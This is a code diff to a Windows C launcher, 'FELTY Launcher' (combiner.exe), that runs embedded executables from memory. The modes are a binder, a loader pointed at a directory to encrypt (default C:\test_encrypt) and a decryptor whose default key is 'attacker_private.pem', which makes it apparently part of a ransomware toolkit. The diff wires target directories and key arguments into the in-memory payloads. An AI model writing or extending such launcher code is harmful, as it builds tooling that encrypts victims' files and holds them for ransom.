@@ -54,20 +54,36 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
     int argc;
     LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (argc < 2) {
-        MessageBoxW(NULL, L"Usage:\r\n  combiner.exe binder\r\n  combiner.exe loader\r\n  combiner.exe decrypt",
+        MessageBoxW(NULL, L"Usage:\r\n"
+                          L"  combiner.exe binder\r\n"
+                          L"  combiner.exe loader <directory>\r\n"
+                          L"  combiner.exe decrypt <key.pem> <directory>",
                     L"FELTY Launcher", MB_ICONINFORMATION);
         LocalFree(argv);
         return 0;
     }
+
     const wchar_t *mode = argv[1];
-    if (_wcsicmp(mode, L"binder") == 0)
+    if (_wcsicmp(mode, L"binder") == 0) {
         RunFromMemory(felty_binder_exe, felty_binder_exe_len, NULL);
-    else if (_wcsicmp(mode, L"loader") == 0)
-        RunFromMemory(felty_loader_exe, felty_loader_exe_len, NULL);
-    else if (_wcsicmp(mode, L"decrypt") == 0)
-        RunFromMemory(felty_decrypt_exe, felty_decrypt_exe_len, NULL);
-    else
+    }
+    else if (_wcsicmp(mode, L"loader") == 0) {
+        // loader expects: <directory>
+        const wchar_t *dir = argc >= 3 ? argv[2] : L"C:\\test_encrypt";  // default if missing
+        RunFromMemory(felty_loader_exe, felty_loader_exe_len, dir);
+    }
+    else if (_wcsicmp(mode, L"decrypt") == 0) {
+        // decrypt expects: <key.pem> <directory>
+        const wchar_t *key = argc >= 3 ? argv[2] : L"attacker_private.pem";
+        const wchar_t *dir = argc >= 4 ? argv[3] : L"C:\\test_encrypt";
+        wchar_t args[512];
+        wsprintfW(args, L"%s %s", key, dir);
+        RunFromMemory(felty_decrypt_exe, felty_decrypt_exe_len, args);
+    }
+    else {
         MessageBoxW(NULL, L"Unknown mode. Use: binder, loader, decrypt", L"Error", MB_ICONERROR);
+    }
+
     LocalFree(argv);
     return 0;
 }
